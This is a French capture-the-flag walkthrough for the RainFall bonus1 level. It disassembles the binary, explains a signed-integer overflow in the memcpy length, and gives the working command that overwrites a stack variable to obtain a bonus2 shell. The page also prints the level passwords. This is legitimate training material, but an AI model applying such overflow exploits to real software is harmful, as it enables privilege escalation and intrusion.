## 1: Analyse

### A: C'est quoi mon binaire?

  ```shell
  # On se connecte si c'est pas déja fait via le bonus0
  $ ssh bonus1@127.0.0.1 -p 4242
     _____       _       ______    _ _
    |  __ \     (_)     |  ____|  | | |
    | |__) |__ _ _ _ __ | |__ __ _| | |
    |  _  /  _` | | '_ \|  __/ _` | | |
    | | \ \ (_| | | | | | | | (_| | | |
    |_|  \_\__,_|_|_| |_|_|  \__,_|_|_|

                  Good luck & Have fun

    To start, ssh with level0/level0 on 10.0.2.15:4242
  bonus1@127.0.0.1's password cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
  [...]
  bonus1@RainFall:~$
  
  # On regarde ce qu'on a
  bonus1@RainFall:~$ ls -la
    total 17
    dr-xr-x---+ 1 bonus1 bonus1   80 Mar  6  2016 .
    dr-x--x--x  1 root   root    340 Sep 23  2015 ..
    -rw-r--r--  1 bonus1 bonus1  220 Apr  3  2012 .bash_logout
    -rw-r--r--  1 bonus1 bonus1 3530 Sep 23  2015 .bashrc
    -rwsr-s---+ 1 bonus2 users  5043 Mar  6  2016 bonus1
    -rw-r--r--+ 1 bonus1 bonus1   65 Sep 23  2015 .pass
    -rw-r--r--  1 bonus1 bonus1  675 Apr  3  2012 .profile

  # On teste les arguments
  bonus1@RainFall:~$ ./bonus1
    Segmentation fault (core dumped)
  bonus1@RainFall:~$ ./bonus1 bonjour
  bonus1@RainFall:~$ ./bonus1 123
  bonus1@RainFall:~$ ./bonus1 8
    Segmentation fault (core dumped)
  bonus1@RainFall:~$ ./bonus1 1234567890984321234
  ```
  * Sans arg on segfault
  * Avec un petit nombre en argument on segfault


### B: On l'ouvre avec gdb
  * On va dans tmp pour lancer avec peda qu'on a copié avec le setup.sh
  ```shell
    bonus1@RainFall:~$ cd /tmp
  ```

  * On lance gdb avec notre binaire
  ```shell
    bonus1@RainFall:/tmp$ gdb ~/bonus1
      [...]
      Reading symbols from /home/user/bonus1/bonus1...(no debugging symbols found)...done.
  ```

  * Qu'est-ce qu'on a comme fonctions?
  ```shell
    gdb-peda$ info functions
    All defined functions:

    Non-debugging symbols:
    0x080482d4  _init
    0x08048320  memcpy
    0x08048320  memcpy@plt
    0x08048330  __gmon_start__
    0x08048330  __gmon_start__@plt
    0x08048340  __libc_start_main
    0x08048340  __libc_start_main@plt
    0x08048350  execl
    0x08048350  execl@plt
    0x08048360  atoi
    0x08048360  atoi@plt
    0x08048370  _start
    0x080483a0  __do_global_dtors_aux
    0x08048400  frame_dummy # Func interessantes ?
    0x08048424  main        # Func interessantes ?
    0x080484b0  __libc_csu_init
    0x08048520  __libc_csu_fini
    0x08048522  __i686.get_pc_thunk.bx
    0x08048530  __do_global_ctors_aux
    0x0804855c  _fini
  ```

  * Commandes lancées pendant l'analyse du binaire ci-dessous
  ```shell
    gdb-peda$ x/s 0x8048580
      0x8048580:	 "sh"

    gdb-peda$ x/s 0x8048583
      0x8048583:	 "/bin/sh"
  ```

  * On disassemble main pour regarder le code
  ```shell
    gdb-peda$ pdisas main
      Dump of assembler code for function main:
      # Initialisation, alignement, et allocation de 64 octets
      0x08048424 <+0>:	push   ebp
      0x08048425 <+1>:	mov    ebp,esp
      0x08048427 <+3>:	and    esp,0xfffffff0
      0x0804842a <+6>:	sub    esp,0x40

      # number = atoi(argv[1])
      0x0804842d <+9>:	mov    eax,DWORD PTR [ebp+0xc]
      0x08048430 <+12>:	add    eax,0x4
      0x08048433 <+15>:	mov    eax,DWORD PTR [eax]
      0x08048435 <+17>:	mov    DWORD PTR [esp],eax
      0x08048438 <+20>:	call   0x8048360 <atoi@plt>

      # if number <= 9 Jump main+43
      0x0804843d <+25>:	mov    DWORD PTR [esp+0x3c],eax
      0x08048441 <+29>:	cmp    DWORD PTR [esp+0x3c],0x9
      0x08048446 <+34>:	jle    0x804844f <main+43>

      # Sinon jump a main+127 Return 1
      0x08048448 <+36>:	mov    eax,0x1
      0x0804844d <+41>:	jmp    0x80484a3 <main+127>

      # Call memcpy(buffer, argv[2], number)
      0x0804844f <+43>:	mov    eax,DWORD PTR [esp+0x3c]
      0x08048453 <+47>:	lea    ecx,[eax*4+0x0]
      0x0804845a <+54>:	mov    eax,DWORD PTR [ebp+0xc]
      0x0804845d <+57>:	add    eax,0x8
      0x08048460 <+60>:	mov    eax,DWORD PTR [eax]
      0x08048462 <+62>:	mov    edx,eax
      0x08048464 <+64>:	lea    eax,[esp+0x14]
      0x08048468 <+68>:	mov    DWORD PTR [esp+0x8],ecx
      0x0804846c <+72>:	mov    DWORD PTR [esp+0x4],edx
      0x08048470 <+76>:	mov    DWORD PTR [esp],eax
      0x08048473 <+79>:	call   0x8048320 <memcpy@plt>

      # if number != 1 464 814 662 return0
      0x08048478 <+84>:	cmp    DWORD PTR [esp+0x3c],0x574f4c46
      0x08048480 <+92>:	jne    0x804849e <main+122>

      # else call execl("/bin/sh", "sh", NULL)
      0x08048482 <+94>:	mov    DWORD PTR [esp+0x8],0x0
      0x0804848a <+102>:	mov    DWORD PTR [esp+0x4],0x8048580
      0x08048492 <+110>:	mov    DWORD PTR [esp],0x8048583
      0x08048499 <+117>:	call   0x8048350 <execl@plt>
      0x0804849e <+122>:	mov    eax,0x0

      # Return eax
      0x080484a3 <+127>:	leave
      0x080484a4 <+128>:	ret
      End of assembler dump.
  ```

## 2: Comportement
  * Notre programme prend en fait 2 paramètres.
  * Le premier (number1) est un nombre qui doit être > 9.
  * Le deuxieme va être copié de number1 elements.
  * Ensuite le programme lance un shell si number1 est de 1 464 814 662 sinon il return 0

## 3: Exploit

### A: Explication

> On ne peut copier que 9 chars maximum de argv[2] dans dest. Cela ne sera pas suffisant pour réécrire sur number1 (9 * 4 < 44).
> Or on voit dans le prototype de memcpy que number1 * 4 va être casté implicitement en size_t.
> En passant un nombre négatif dans number1 on va pouvoir, grâce au cast implicite, écrire le nombre de char de argv[2] que l'on souhaite.
> On va donc écrire 1 464 814 662 en little endian \x46\x4c\x4f\x57 et le passer dans notre 2eme argument avec l'offset voulu.
> Pour l'offset, on sait que number est a EBP - 4 et le buffer passé à memcpy est a EBP - 44.
> Il nous faut donc 40 d'offset avant d'ecrire "\x46\x4c\x4f\x57".
> Il faut aussi que (size_t)(number1 * 4) = 44.


### B: Creation de l'exploit

* Il nous faut donc: trouver notre premier argument.
* Le deuxieme est le suivant: `python -c 'print "A" * 40 + "\x46\x4c\x4f\x57"'`
* Pour le premier, on fait un petit programme en c:

```c
#include <stdlib.h>
#include <stdio.h>

int     main(int argc, char **argv)
{
    int number1;

    number1 = atoi(argv[1]);
    printf("%d %zu\n", number1, number1 * 4);
    return (0);
}
```
```shell
  bonus1@RainFall:/tmp$ gcc find_number1.c; ./a.out -2147483648; rm a.out
    -2147483648 0
  bonus1@RainFall:/tmp$ gcc find_number1.c; ./a.out -2147483647; rm a.out
    -2147483647 4
  bonus1@RainFall:/tmp$ gcc find_number1.c; ./a.out -2147483646; rm a.out
    -2147483646 8
  # Et donc avec un petit calcul...
  bonus1@RainFall:/tmp$ gcc find_number1.c; ./a.out -2147483637; rm a.out
    -2147483637 44
```

* On lance donc notre exploit

```shell
  bonus1@RainFall:/tmp$ ~/bonus1 -2147483637 $(python -c 'print "A" * 40 + "\x46\x4c\x4f\x57"')
  $ whoami
    bonus2
  $ cat /home/user/bonus2/.pass
    579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
  bonus1@RainFall:/tmp$ su bonus2
    Password: 579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
    RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
    No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/bonus2/bonus2
  bonus2@RainFall:~$
```